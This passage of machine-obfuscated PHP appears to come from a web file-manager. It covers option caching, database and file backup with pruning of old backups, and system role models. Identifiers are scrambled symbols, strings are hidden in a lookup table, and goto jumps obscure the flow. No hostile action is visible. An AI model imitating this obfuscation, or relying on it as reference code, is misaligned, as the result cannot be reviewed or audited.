$€Áπ‡áò[$öŸ˚˚˜û[243]] = time(); $€Áπ‡áò[$öŸ˚˚˜û[98]] = time(); Model($this->modelType)->set($öŸ˚˚˜û[484], $ñ¶”¡ö≠, $this->optionType . $öŸ˚˚˜û[485]); Model($this->modelType)->set($öŸ˚˚˜û[483] . $ñ¶”¡ö≠, $€Áπ‡áò, $this->optionType); return $ñ¶”¡ö≠; } public function update($Œœƒ‚á∆, $Óπñ«âë) { $ä⁄√ÈüÆ =& $_SERVER[ˆë€Ï⁄∂]; $Óπñ«âë = array_field_key($Óπñ«âë, $this->field); $¸’õÙ‚Ñ = $this->listData($Œœƒ‚á∆); if (!$¸’õÙ‚Ñ || !$Œœƒ‚á∆) { return !1; } $Óπñ«âë = array_merge($¸’õÙ‚Ñ, $Óπñ«âë); $Óπñ«âë[$ä⁄√ÈüÆ[98]] = time(); return Model($this->modelType)->set($ä⁄√ÈüÆ[483] . $Œœƒ‚á∆, $Óπñ«âë, $this->optionType); } public function remove($÷¡Ûìñ‡) { if (!$÷¡Ûìñ‡) { return !1; } return Model($this->modelType)->remove($_SERVER[ˆë€Ï⁄∂][483] . $÷¡Ûìñ‡, $this->optionType); } public function clear() { $∏õ©ùÚé =& $_SERVER[ˆë€Ï⁄∂]; Model($this->modelType)->remove($∏õ©ùÚé[484], $this->optionType . $∏õ©ùÚé[485]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($í˝Êï‚’, $È∏ï∏§Ê) { if (!$È∏ï∏§Ê) { return !1; } $√’ª±¨Ë = $this->listData(); $√’ª±¨Ë = array_to_keyvalue($√’ª±¨Ë, $í˝Êï‚’); return isset($√’ª±¨Ë[$È∏ï∏§Ê]) ? $√’ª±¨Ë[$È∏ï∏§Ê] : !1; } public function findByName($∑•¿¶ªé) { return $this->findByKey($_SERVER[ˆë€Ï⁄∂][32], $∑•¿¶ªé); } protected function resetData($ûª˛˜˚¢) { $ÕÈ†®Àﬂ =& $_SERVER[ˆë€Ï⁄∂]; $ûª˛˜˚¢ = is_array($ûª˛˜˚¢) ? $ûª˛˜˚¢ : array(); $˝Ú¸¸€› = array(); for ($´∂õ≥≥— = 0; $´∂õ≥≥— < count($ûª˛˜˚¢); $´∂õ≥≥—++) { $˝Ú¸¸€›[$ÕÈ†®Àﬂ[483] . $ûª˛˜˚¢[$´∂õ≥≥—][$ÕÈ†®Àﬂ[486]]] = $ûª˛˜˚¢[$´∂õ≥≥—]; } return Model($this->modelType)->set($˝Ú¸¸€›, !1, $this->optionType); } private function getAutoName($ˆªπÉá˘) { $∑»£ ÷˜ = array_to_keyvalue($this->listData(), $_SERVER[ˆë€Ï⁄∂][32]); if (!$∑»£ ÷˜ || !isset($∑»£ ÷˜[$ˆªπÉá˘])) { return $ˆªπÉá˘; } for ($©£ƒ˘õ∞ = 1; $©£ƒ˘õ∞ < count($∑»£ ÷˜); $©£ƒ˘õ∞++) { $¿ÃæâÅ˝ = $ˆªπÉá˘ . "\x28{$©£ƒ˘õ∞}\51"; if (!isset($∑»£ ÷˜[$¿ÃæâÅ˝])) { return $¿ÃæâÅ˝; } } return $¿ÃæâÅ˝; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($é·Øﬂáé = false, $ÿíæ°ÜÏ = '', $ï„≤†®ß = false) { $´œµ†÷Ì =& $_SERVER[ˆë€Ï⁄∂]; $êû≥√É· = $this->cacheGet($ÿíæ°ÜÏ); $·¿µ‡„¥ = $this->optionDefault($ÿíæ°ÜÏ); $·¿µ‡„¥ = is_array($·¿µ‡„¥) ? $·¿µ‡„¥ : array(); if (is_array($êû≥√É·)) { $êû≥√É· = array_merge($·¿µ‡„¥, $êû≥√É·); return $é·Øﬂáé ? isset($êû≥√É·[$é·Øﬂáé]) ? $êû≥√É·[$é·Øﬂáé] : null : $êû≥√É·; } $ù‹˘Áéä = $this->filterWhere(array($´œµ†÷Ì[33] => $ÿíæ°ÜÏ)); $êû≥√É· = $this->where($ù‹˘Áéä)->select(); $êû≥√É· = array_to_keyvalue($êû≥√É·, $´œµ†÷Ì[107], $´œµ†÷Ì[461]); foreach ($êû≥√É· as $ÔŸ≈¸Ä∂ => $˝Í°Ÿù) { if ($ï„≤†®ß || in_array($ÔŸ≈¸Ä∂, $this->jsonField)) { $êû≥√É·[$ÔŸ≈¸Ä∂] = json_decode($˝Í°Ÿù, !0); } } $this->cacheSet($ÿíæ°ÜÏ, $êû≥√É·); $êû≥√É· = array_merge($·¿µ‡„¥, $êû≥√É·); return $é·Øﬂáé ? $êû≥√É·[$é·Øﬂáé] : $êû≥√É·; } public function set($‰Ô˚¬ñı, $ÔÍî…˚ÿ = false, $—±âø…— = '') { $Õ“√˙ÚÍ =& $_SERVER[ˆë€Ï⁄∂]; $this->cacheRemove($—±âø…—); $¯ Èà·® = array(); $–‘“ó≠≤ = is_array($‰Ô˚¬ñı) ? $‰Ô˚¬ñı : array($‰Ô˚¬ñı => $ÔÍî…˚ÿ); foreach ($–‘“ó≠≤ as $å¬ò˜Ú√ => $¬ú˙¸∆´) { if (is_array($¬ú˙¸∆´)) { $¬ú˙¸∆´ = json_encode_force($¬ú˙¸∆´); } $this->checkLength($¬ú˙¸∆´, !1, $this->tableName . $Õ“√˙ÚÍ[4] . $‰Ô˚¬ñı); $¬ú˙¸∆´ = self::textEncode($¬ú˙¸∆´); $–‘“ó≠≤ = array($Õ“√˙ÚÍ[33] => $—±âø…—, $Õ“√˙ÚÍ[107] => $å¬ò˜Ú√, $Õ“√˙ÚÍ[461] => $¬ú˙¸∆´); $¯ Èà·®[] = $this->filterWhere($–‘“ó≠≤); } if (!$¯ Èà·®) { return !0; } $≤ì—§Øº = $this->cacheKey($Õ“√˙ÚÍ[487]); CacheLock::lock($≤ì—§Øº); $¢πÖíÆπ = $this->addAll($¯ Èà·®, array(), !0); CacheLock::unlock($≤ì—§Øº); return $¢πÖíÆπ; } protected function optionDefault($∑á·ç»¯ = '') { return !1; } public function setDeep($°øÌÇêâ, $◊÷µ¸Ÿ¸ = false, $Û‰≤Ê£Ê = '') { $„‰ﬂÌ‚µ = explode($_SERVER[ˆë€Ï⁄∂][10], $°øÌÇêâ); $å§¿ﬁ≈ë = $this->get(); array_set_value($å§¿ﬁ≈ë, $°øÌÇêâ, $◊÷µ¸Ÿ¸); $this->set($„‰ﬂÌ‚µ[0], $å§¿ﬁ≈ë[$„‰ﬂÌ‚µ[0]], $Û‰≤Ê£Ê); } public function remove($å°õ‰˘Î, $˝«Òç√ê = '') { $¥ôﬂﬂÄ≈ =& $_SERVER[ˆë€Ï⁄∂]; $this->cacheRemove($˝«Òç√ê); $ﬂçÉ≥øµ = $this->filterWhere(array($¥ôﬂﬂÄ≈[107] => $å°õ‰˘Î, $¥ôﬂﬂÄ≈[33] => $˝«Òç√ê)); if (is_null($å°õ‰˘Î)) { unset($ﬂçÉ≥øµ[$¥ôﬂﬂÄ≈[107]]); } return $this->where($ﬂçÉ≥øµ)->delete(); } public function cacheSet($ê —Úß©, $üµ¸Äƒ© = false) { return Cache::set($this->cacheKey($ê —Úß©), $üµ¸Äƒ©); } public function cacheGet($‘ó”ñŒ) { return Cache::get($this->cacheKey($‘ó”ñŒ)); } public function cacheRemove($§´ë°πË) { return Cache::remove($this->cacheKey($§´ë°πË)); } protected function filterWhere($Á«ôÈ…‡) { return $Á«ôÈ…‡; } protected function cacheKey($‡öøÛŒ‘) { return $‡öøÛŒ‘; } } goto BÆ•ÈÓÖæì; c€Öå≥—∆û: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ˆë€Ï⁄∂][839]); $this->init(); $this->keep(); } public function init() { $≠ƒ˝Ø§ =& $_SERVER[ˆë€Ï⁄∂]; $this->isManual(); self::$name = date($≠ƒ˝Ø§[840]); if (!($ŒªØÖ¬˚ = $this->model->lastItem())) { $ŒªØÖ¬˚ = $this->initData(); } else { self::$name = $ŒªØÖ¬˚[$≠ƒ˝Ø§[32]]; if ($ŒªØÖ¬˚[$≠ƒ˝Ø§[841]] == $≠ƒ˝Ø§[101]) { self::$name = date($≠ƒ˝Ø§[271]); $ﬁà„ı∂· = intval(_get($ŒªØÖ¬˚, $≠ƒ˝Ø§[842], 0)); if (self::$manual == 0 && $ŒªØÖ¬˚[$≠ƒ˝Ø§[32]] == self::$name) { $this->model->remove($ŒªØÖ¬˚[$≠ƒ˝Ø§[486]]); } $ŒªØÖ¬˚ = $this->initData($ﬁà„ı∂·, $ŒªØÖ¬˚[$≠ƒ˝Ø§[843]]); } else { $this->checkStore($ŒªØÖ¬˚[$≠ƒ˝Ø§[843]]); } } self::$option = $ŒªØÖ¬˚; } private function isManual() { $†”£Ω‰¥ = _get($GLOBALS, $_SERVER[ˆë€Ï⁄∂][844], 0); $†”£Ω‰¥ = intval($†”£Ω‰¥); self::$manual = $†”£Ω‰¥ && $†”£Ω‰¥ == 1 ? 1 : 0; } private function initData($º∞úœ˘Õ = 0, $◊Ö™´û“ = '') { $Î‚∑øú÷ =& $_SERVER[ˆë€Ï⁄∂]; $Ù¶òô∆è = $this->model->config(); if ($◊Ö™´û“ && $Ù¶òô∆è[$Î‚∑øú÷[843]] != $◊Ö™´û“) { $º∞úœ˘Õ = 0; } $this->checkStore($Ù¶òô∆è[$Î‚∑øú÷[843]]); if (self::$manual == 1) { self::$name .= $Î‚∑øú÷[11] . date($Î‚∑øú÷[845]); } $Ëìï™ÊŒ = array($Î‚∑øú÷[843] => $Ù¶òô∆è[$Î‚∑øú÷[843]], $Î‚∑øú÷[32] => self::$name, $Î‚∑øú÷[841] => 0, $Î‚∑øú÷[181] => $Ù¶òô∆è[$Î‚∑øú÷[181]], $Î‚∑øú÷[846] => self::$manual, $Î‚∑øú÷[379] => array($Î‚∑øú÷[847] => array($Î‚∑øú÷[841] => 0), $Î‚∑øú÷[848] => array($Î‚∑øú÷[841] => 0, $Î‚∑øú÷[849] => 0, $Î‚∑øú÷[850] => 0, $Î‚∑øú÷[33] => $Î‚∑øú÷[12], $Î‚∑øú÷[851] => 0, $Î‚∑øú÷[852] => 0), $Î‚∑øú÷[853] => array($Î‚∑øú÷[841] => 0, $Î‚∑øú÷[849] => 0, $Î‚∑øú÷[850] => 0, $Î‚∑øú÷[851] => 0, $Î‚∑øú÷[852] => 0), $Î‚∑øú÷[242] => array($Î‚∑øú÷[841] => 0, $Î‚∑øú÷[854] => 0, $Î‚∑øú÷[855] => 0, $Î‚∑øú÷[856] => 0, $Î‚∑øú÷[857] => 0, $Î‚∑øú÷[552] => $º∞úœ˘Õ, $Î‚∑øú÷[851] => 0, $Î‚∑øú÷[852] => 0)), $Î‚∑øú÷[851] => time(), $Î‚∑øú÷[852] => 0); $íÛ⁄ﬂèÓ = $this->model->insert($Ëìï™ÊŒ); $Ëìï™ÊŒ[$Î‚∑øú÷[486]] = $íÛ⁄ﬂèÓ; return $Ëìï™ÊŒ; } private function checkStore($ö€êˆÂË) { $ﬁâ»Ñ©ê = Model($_SERVER[ˆë€Ï⁄∂][858]); $À‚⁄÷Í‹ = $ﬁâ»Ñ©ê->listData($ö€êˆÂË); $ﬁâ»Ñ©ê->checkConfig($À‚⁄÷Í‹); } public static function get() { if (!self::$option) { $©ﬂ∞Ÿ≥æ = Model($_SERVER[ˆë€Ï⁄∂][839]); $ÕÂçƒ„¯ = $©ﬂ∞Ÿ≥æ->findByName(self::$name); $©ﬂ∞Ÿ≥æ->parseContent($ÕÂçƒ„¯); self::$option = $ÕÂçƒ„¯; } return self::$option; } public static function set($÷Ã…ÌÊÉ) { $·ÒÛã¥ø =& $_SERVER[ˆë€Ï⁄∂]; $˘•àôøÏ = self::get(); foreach ($÷Ã…ÌÊÉ as $ÑÓ·ÿæ¿ => $’üÚµÆº) { array_set_value($˘•àôøÏ, $ÑÓ·ÿæ¿, $’üÚµÆº); } Model($·ÒÛã¥ø[839])->update($˘•àôøÏ[$·ÒÛã¥ø[486]], $˘•àôøÏ); self::$option = $˘•àôøÏ; return self::$option; } public function keep() { $√òÿË¨Ç =& $_SERVER[ˆë€Ï⁄∂]; $·ÏÁõÅ≤ = self::get(); if (_get($·ÏÁõÅ≤, $√òÿË¨Ç[859], 0) == $√òÿË¨Ç[101]) { return; } $this->backupKeep($·ÏÁõÅ≤); self::set(array($√òÿË¨Ç[859] => 1)); } private function backupKeep($ÂéÜ≥⁄Ô) { $‘Ë£ØÉı =& $_SERVER[ˆë€Ï⁄∂]; if (self::$manual == 1) { return; } $Óß˝Æ∆© = $this->model->listData(); if (empty($Óß˝Æ∆©)) { return; } $ß»Ü¬˙© = 0; $…œÄø√´ = array(); foreach ($Óß˝Æ∆© as $˘ÎÃ†¶ô) { if ($ß»Ü¬˙© >= 7) { break; } $…œÄø√´[] = $˘ÎÃ†¶ô[$‘Ë£ØÉı[32]]; $ß»Ü¬˙©++; } for ($ß»Ü¬˙© = 0; $ß»Ü¬˙© < 12; $ß»Ü¬˙©++) { $…œÄø√´[] = date($‘Ë£ØÉı[860], strtotime("\x2d{$ß»Ü¬˙©}\x20\155\157\156\x74\x68\x73")); } $…œÄø√´ = array_unique($…œÄø√´); $ŸÇÀîÖÛ = Model($‘Ë£ØÉı[861])->get($‘Ë£ØÉı[862]); foreach ($Óß˝Æ∆© as $˘ÎÃ†¶ô) { if (isset($˘ÎÃ†¶ô[$‘Ë£ØÉı[846]]) && $˘ÎÃ†¶ô[$‘Ë£ØÉı[846]] == $‘Ë£ØÉı[101]) { continue; } if (!empty($˘ÎÃ†¶ô[$‘Ë£ØÉı[32]]) && in_array($˘ÎÃ†¶ô[$‘Ë£ØÉı[32]], $…œÄø√´)) { continue; } $this->model->remove($˘ÎÃ†¶ô[$‘Ë£ØÉı[486]]); $ﬂ±†±≥ = $this->backupPath($ÂéÜ≥⁄Ô, $ŸÇÀîÖÛ); IO::remove($ﬂ±†±≥, !1); } } private function backupPath($øµ‹Æ◊˚, $¿µòäΩœ = false) { $ÕƒßÕŒº =& $_SERVER[ˆë€Ï⁄∂]; if (!$¿µòäΩœ) { $¿µòäΩœ = Model($ÕƒßÕŒº[861])->get($ÕƒßÕŒº[862]); } $⁄«πÍ˘® = $øµ‹Æ◊˚[$ÕƒßÕŒº[32]]; $◊ÕÍÕÇß = substr(md5($ÕƒßÕŒº[863] . $¿µòäΩœ . $⁄«πÍ˘®), 0, 8); return "\x7b\x69\157\x3a{$øµ‹Æ◊˚[$ÕƒßÕŒº[843]]}\x7d\x2f\144\x61\164\141\x62\x61\163\145\57\142\141\x63\153\165\160\x2f" . $⁄«πÍ˘® . $ÕƒßÕŒº[11] . $◊ÕÍÕÇß; } public function db() { $íîüÈ–— =& $_SERVER[ˆë€Ï⁄∂]; $°‹ßûŸÁ = self::get(); if (_get($°‹ßûŸÁ, $íîüÈ–—[864], 0) == $íîüÈ–—[101]) { return !0; } $˙Ü˜ŸÌ≥ = new BackupDb(); if (!$˙Ü˜ŸÌ≥->index()) { return !1; } self::set(array($íîüÈ–—[864] => 1)); return !0; } public function dbFile() { $È˚√»ÇÊ =& $_SERVER[ˆë€Ï⁄∂]; $É…ã“Ç· = self::get(); if (_get($É…ã“Ç·, $È˚√»ÇÊ[865], 0) == $È˚√»ÇÊ[101]) { return !0; } $ÿﬁ¢Õó∫ = new BackupDbFile(); if (!$ÿﬁ¢Õó∫->index()) { return !1; } self::set(array($È˚√»ÇÊ[865] => 1)); return !0; } public function file() { $ï˛¥˜¶∆ =& $_SERVER[ˆë€Ï⁄∂]; $¯¥˝à‚¡ = self::get(); if (_get($¯¥˝à‚¡, $ï˛¥˜¶∆[866], 0) == $ï˛¥˜¶∆[101]) { return !0; } if ($¯¥˝à‚¡[$ï˛¥˜¶∆[181]] == $ï˛¥˜¶∆[867]) { $«üÌëá´ = new BackupFile(); if (!$«üÌëá´->index()) { return !1; } } self::set(array($ï˛¥˜¶∆[866] => 1, $ï˛¥˜¶∆[841] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¶ªÉ˜Çö =& $_SERVER[ˆë€Ï⁄∂]; $∏·«£ÁÑ = Backup::get(); self::$io = $∏·«£ÁÑ[$¶ªÉ˜Çö[843]]; self::$name = $∏·«£ÁÑ[$¶ªÉ˜Çö[32]]; $ã˙€√…á = new DbManage(); $¬ò˜Æ±œ = $ã˙€√…á->dbType(); $Ì¯»€ø› = array($¶ªÉ˜Çö[868] => $¬ò˜Æ±œ, $¶ªÉ˜Çö[869] => time()); Backup::set($Ì¯»€ø›); $ìí∏¡ÅÄ = $this->tmpFilesPath() . $¶ªÉ˜Çö[870] . self::$name . $¶ªÉ˜Çö[8]; del_dir($ìí∏¡ÅÄ); mk_dir($ìí∏¡ÅÄ); $Öº§˙⁄÷ = $íËòÆõ√ = 0; try { $ÌÛÄ◊≤˚ = $ã˙€√…á->db()->getTables(); } catch (Exception $Ô‘∑…«›) { return !1; } $ÌÛÄ◊≤˚ = array_diff($ÌÛÄ◊≤˚, array($¶ªÉ˜Çö[871], $¶ªÉ˜Çö[872])); foreach ($ÌÛÄ◊≤˚ as $ï”ıÛ∫’) { if ($ï”ıÛ∫’ == $¶ªÉ˜Çö[873]) { continue; } $Öº§˙⁄÷ += $ã˙€√…á->model($ï”ıÛ∫’)->count(); } $†ﬁÒî¸º = new Task($¶ªÉ˜Çö[874], $¶ªÉ˜Çö[875], $Öº§˙⁄÷, LNG($¶ªÉ˜Çö[876]) . $¶ªÉ˜Çö[877] . LNG($¶ªÉ˜Çö[878])); $GLOBALS[$¶ªÉ˜Çö[879]] = self::$name; foreach ($ÌÛÄ◊≤˚ as $ï”ıÛ∫’) { $æ—›ËÙı = $ìí∏¡ÅÄ . $ï”ıÛ∫’ . $¶ªÉ˜Çö[880]; if ($ï”ıÛ∫’ == $¶ªÉ˜Çö[873]) { @touch($æ—›ËÙı); continue; } $‡„ÖÇÓ¶ = null; if ($ï”ıÛ∫’ == $¶ªÉ˜Çö[881] && $∏·«£ÁÑ[$¶ªÉ˜Çö[181]] == $¶ªÉ˜Çö[867]) { $‡„ÖÇÓ¶ = self::$io; } $íËòÆõ√ += $ã˙€√…á->sqlFromDb($ï”ıÛ∫’, $æ—›ËÙı, $†ﬁÒî¸º, $‡„ÖÇÓ¶); } unset($GLOBALS[$¶ªÉ˜Çö[879]]); $†ﬁÒî¸º->end(); if ($íËòÆõ√ > $Öº§˙⁄÷) { $Öº§˙⁄÷ = $íËòÆõ√; } $Ì¯»€ø› = array($¶ªÉ˜Çö[868] => $¬ò˜Æ±œ, $¶ªÉ˜Çö[864] => 1, $¶ªÉ˜Çö[882] => $Öº§˙⁄÷, $¶ªÉ˜Çö[883] => $íËòÆõ√, $¶ªÉ˜Çö[884] => time()); Backup::set($Ì¯»€ø›); if ($Öº§˙⁄÷ - $íËòÆõ√ > 0) { $Ü·ÁØ”Ä = $¶ªÉ˜Çö[885]; if (!stristr(I18n::getType(), $¶ªÉ˜Çö[886])) { $Ü·ÁØ”Ä = $¶ªÉ˜Çö[887]; } write_log(array($Ü·ÁØ”Ä, $Ì¯»€ø›), $¶ªÉ˜Çö[875]); return !1; } return !0; } private function tmpFilesPath() { $∑®∆ﬁúì =& $_SERVER[ˆë€Ï⁄∂]; $¥·¢ë©ú = TEMP_FILES; if ($GLOBALS[$∑®∆ﬁúì[6]][$∑®∆ﬁúì[102]][$∑®∆ﬁúì[888]]) { $¥·¢ë©ú = $GLOBALS[$∑®∆ﬁúì[6]][$∑®∆ﬁúì[102]][$∑®∆ﬁúì[888]]; if (!mk_dir($¥·¢ë©ú) || !is_writable($¥·¢ë©ú) || !IO::mkfile($¥·¢ë©ú . $∑®∆ﬁúì[889])) { $¥·¢ë©ú = TEMP_FILES; } } return $¥·¢ë©ú; } } class BackupDbFile { public function __construct() { } public function index() { $¡Æ“¯äÂ =& $_SERVER[ˆë€Ï⁄∂]; $œ≈¢®˙Ç = Backup::get(); $üƒ⁄ﬂ™Ì = $œ≈¢®˙Ç[$¡Æ“¯äÂ[32]]; $¨–Ù◊£˜ = $this->tmpFilesPath() . "\142\141\x63\153\x75\160\x5f{$üƒ⁄ﬂ™Ì}\x2f"; $¢È∫û≥µ = $this->backupPath($œ≈¢®˙Ç); if (!($¢È∫û≥µ = IO::mkdir($¢È∫û≥µ))) { return !1; } $ÀŸµä˜∑ = IO::listPath($¨–Ù◊£˜); $ŒòπÒç˘ = isset($ÀŸµä˜∑[$¡Æ“¯äÂ[96]]) ? $ÀŸµä˜∑[$¡Æ“¯äÂ[96]] : array(); $˚ç†◊–Ç = array_sum(array_column($ŒòπÒç˘, $¡Æ“¯äÂ[89])); if (!$˚ç†◊–Ç) { return !1; } $ˆä†õúÿ = array($¡Æ“¯äÂ[890] => $˚ç†◊–Ç, $¡Æ“¯äÂ[891] => time()); Backup::set($ˆä†õúÿ); $®±™’ë = new TaskFileTransfer($¡Æ“¯äÂ[892], $¡Æ“¯äÂ[875], count($ŒòπÒç˘), LNG($¡Æ“¯äÂ[876]) . $¡Æ“¯äÂ[473] . LNG($¡Æ“¯äÂ[878]) . $¡Æ“¯äÂ[893]); $®±™’ë->task[$¡Æ“¯äÂ[854]] = $˚ç†◊–Ç; foreach ($ÀŸµä˜∑[$¡Æ“¯äÂ[96]] as $„∑íÁ´—) { $⁄…∞‰Ã∫ = IO::move($„∑íÁ´—[$¡Æ“¯äÂ[97]], $¢È∫û≥µ); if (!$⁄…∞‰Ã∫) { $®±™’ë->end(); $¢á—πßü = IO::getLastError($¡Æ“¯äÂ[894] . $„∑íÁ´—[$¡Æ“¯äÂ[97]] . $¡Æ“¯äÂ[895] . $¢È∫û≥µ . $¡Æ“¯äÂ[188]); write_log($¢á—πßü, $¡Æ“¯äÂ[875]); return !1; } } $Œ«âÎÚÙ = new DbManage(); $ØÀ√ë›∆ = $Œ«âÎÚÙ->getSqlFile(); if (!$ØÀ√ë›∆[$¡Æ“¯äÂ[896]] || !$ØÀ√ë›∆[$¡Æ“¯äÂ[13]]) { return !1; } IO::move($ØÀ√ë›∆[$¡Æ“¯äÂ[896]], $¢È∫û≥µ); IO::move($ØÀ√ë›∆[$¡Æ“¯äÂ[13]], $¢È∫û≥µ); $®±™’ë->end(); $ˆä†õúÿ = array($¡Æ“¯äÂ[897] => $˚ç†◊–Ç, $¡Æ“¯äÂ[898] => time()); Backup::set($ˆä†õúÿ); return !0; } private function backupPath($Û˘Ùƒªƒ) { $·®‡ﬁ˚“ =& $_SERVER[ˆë€Ï⁄∂]; $˜ß⁄±…“ = $Û˘Ùƒªƒ[$·®‡ﬁ˚“[32]]; $®üﬁâ’’ = Model($·®‡ﬁ˚“[861])->get($·®‡ﬁ˚“[862]); $‡Œ∑’“ﬁ = substr(md5($·®‡ﬁ˚“[863] . $®üﬁâ’’ . $˜ß⁄±…“), 0, 8); return "\173\151\x6f\72{$Û˘Ùƒªƒ[$·®‡ﬁ˚“[843]]}\x7d\x2f\144\141\x74\x61\x62\141\x73\145\x2f\x62\141\143\x6b\x75\160\x2f" . $˜ß⁄±…“ . $·®‡ﬁ˚“[11] . $‡Œ∑’“ﬁ; } private function tmpFilesPath() { $ﬁ«ö¿«¨ =& $_SERVER[ˆë€Ï⁄∂]; $∏¨’ƒ≥ÿ = TEMP_FILES; if ($GLOBALS[$ﬁ«ö¿«¨[6]][$ﬁ«ö¿«¨[102]][$ﬁ«ö¿«¨[888]]) { $∏¨’ƒ≥ÿ = $GLOBALS[$ﬁ«ö¿«¨[6]][$ﬁ«ö¿«¨[102]][$ﬁ«ö¿«¨[888]]; if (!mk_dir($∏¨’ƒ≥ÿ) || !is_writable($∏¨’ƒ≥ÿ) || !IO::mkfile($∏¨’ƒ≥ÿ . $ﬁ«ö¿«¨[889])) { $∏¨’ƒ≥ÿ = TEMP_FILES; } } return $∏¨’ƒ≥ÿ; } } goto F“â°Üÿ„é; cóÏËê‰„∫: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\x65\x6d\137\x6f\x70\164\151\157\x6e"; protected $jsonField = array("\155\x65\x6e\165", "\162\x6f\154\145", "\162\x6f\154\145\x47\162\157\165\160", "\x72\145\x67\x69\x73\x74", "\x65\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ëŒ¡©Öà) { return "\x53\171\163\x74\x65\155\117\160\x74\151\157\156\x5f{$ëŒ¡©Öà}"; } protected function optionDefault($…Î˛ó∑ˆ = '') { $Æ€ú†Åô =& $_SERVER[ˆë€Ï⁄∂]; if ($…Î˛ó∑ˆ == $Æ€ú†Åô[12]) { return $GLOBALS[$Æ€ú†Åô[6]][$Æ€ú†Åô[468]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\x72\157\154\145\x4c\x69\163\164"; public $field = array("\156\x61\x6d\145", "\x61\165\x74\150", "\x6c\141\142\145\154", "\144\151\x73\x70\x6c\x61\171", "\x73\171\x73\164\145\x6d", "\x64\x65\x73\x63", "\x69\147\x6e\x6f\162\x65\x45\170\164", "\x69\147\x6e\x6f\162\x65\x46\x69\x6c\x65\x53\151\x7a\x65", "\x61\x64\x6d\x69\x6e\151\163\x74\x72\x61\164\x6f\x72", "\x73\x6f\x72\164"); public function listData($ı£∫†—‡ = false, $™“â˛á— = "\163\x6f\x72\164", $©∆‘Å–‡ = false) { $ﬂ›í–ã« =& $_SERVER[ˆë€Ï⁄∂]; $†ÎÉÎÙ™ = parent::listData($ı£∫†—‡, $™“â˛á—, $©∆‘Å–‡); if (!$ı£∫†—‡) { foreach ($†ÎÉÎÙ™ as $∫î—±Éø => $íÔÉ⁄Îù) { if ($íÔÉ⁄Îù[$ﬂ›í–ã«[2199]] == 1) { $†ÎÉÎÙ™[$∫î—±Éø][$ﬂ›í–ã«[537]] = LNG($ﬂ›í–ã«[2468]); } } } return $†ÎÉÎÙ™; } public function update($ÊÏÔ£Æú, $¡Èòïö¢) { $∂Ω≤”™´ =& $_SERVER[ˆë€Ï⁄∂]; $ÆıÒ«Ê¯ = parent::listData($ÊÏÔ£Æú); $≠á¯Ó∫— = $this->findByName($¡Èòïö¢[$∂Ω≤”™´[32]]); if (!$ÆıÒ«Ê¯ || $≠á¯Ó∫— && $≠á¯Ó∫—[$∂Ω≤”™´[486]] != $ÆıÒ«Ê¯[$∂Ω≤”™´[486]]) { return !1; } if ($≠á¯Ó∫—[$∂Ω≤”™´[2199]] == 1) { $¡Èòïö¢ = array($∂Ω≤”™´[32] => $¡Èòïö¢[$∂Ω≤”™´[32]], $∂Ω≤”™´[2011] => $¡Èòïö¢[$∂Ω≤”™´[2011]]); } $this->filterAuth($¡Èòïö¢[$∂Ω≤”™´[498]]); return parent::update($ÊÏÔ£Æú, $¡Èòïö¢); } public function remove($ï∑∂˙´Ù) { $ÎÔãÙ‚á = parent::listData($ï∑∂˙´Ù); if (!$ÎÔãÙ‚á || $ÎÔãÙ‚á[$_SERVER[ˆë€Ï⁄∂][201]]) { return !1; } return parent::remove($ï∑∂˙´Ù); } public function add($´Ä£¢ü≈) { $›—÷Ë¿† =& $_SERVER[ˆë€Ï⁄∂]; $˘«˝Ê∫˝ = $´Ä£¢ü≈[$›—÷Ë¿†[32]]; if ($this->findByName($˘«˝Ê∫˝)) { return !1; } $ñ’âõŒÉ = array($›—÷Ë¿†[505] => $˘«˝Ê∫˝, $›—÷Ë¿†[1994] => $›—÷Ë¿†[12], $›—÷Ë¿†[1990] => $›—÷Ë¿†[1998], $›—÷Ë¿†[2469] => 1, $›—÷Ë¿†[1993] => 0, $›—÷Ë¿†[2470] => 0, $›—÷Ë¿†[1992] => $this->getSort()); $´Ä£¢ü≈ = array_merge($ñ’âõŒÉ, $´Ä£¢ü≈); $this->filterAuth($´Ä£¢ü≈[$›—÷Ë¿†[498]]); return parent::insert($´Ä£¢ü≈); } private function getSort() { $ﬁ∫‚€˙± =& $_SERVER[ˆë€Ï⁄∂]; $âÒÿ§¿Ω = parent::listData(); $£èàÔ◊Ú = array_to_keyvalue($âÒÿ§¿Ω, $ﬁ∫‚€˙±[12], $ﬁ∫‚€˙±[2012]); return empty($£èàÔ◊Ú) ? 0 : max($£èàÔ◊Ú) + 1; } private function filterAuth(&$ΩïÚ˜÷´) { $Á∏¿ËÍú =& $_SERVER[ˆë€Ï⁄∂]; $Úü¨Åè‡ = array(); $òıÍÏŒª = array_filter(explode($Á∏¿ËÍú[50], $ΩïÚ˜÷´)); foreach ($òıÍÏŒª as $ΩïÚ˜÷´) { $ÕË˛ãÈç = explode($Á∏¿ËÍú[10], $ΩïÚ˜÷´); if ($ÕË˛ãÈç[0] == $Á∏¿ËÍú[2471] && $ÕË˛ãÈç[1] != $Á∏¿ËÍú[1290]) { $’øÌ∏—Ù = $ÕË˛ãÈç[0] . $Á∏¿ËÍú[10] . $ÕË˛ãÈç[1] . $Á∏¿ËÍú[2472]; if (!in_array($’øÌ∏—Ù, $òıÍÏŒª)) { $Úü¨Åè‡[] = $’øÌ∏—Ù; } } $Úü¨Åè‡[] = $ΩïÚ˜÷´; } $ΩïÚ˜÷´ = implode($Á∏¿ËÍú[50], $Úü¨Åè‡); } public function findRoleDefault() { $ÄË≤ë•¿ =& $_SERVER[ˆë€Ï⁄∂]; $∫Ô†√«— = parent::listData(); $Ÿ≈¶Ï≤‹ = !1; foreach ($∫Ô†√«— as $™äÓΩâ€) { if (!$™äÓΩâ€ || $™äÓΩâ€[$ÄË≤ë•¿[2010]] == $ÄË≤ë•¿[240] || $™äÓΩâ€[$ÄË≤ë•¿[2199]] == 1) { continue; } if (strstr($™äÓΩâ€[$ÄË≤ë•¿[498]], 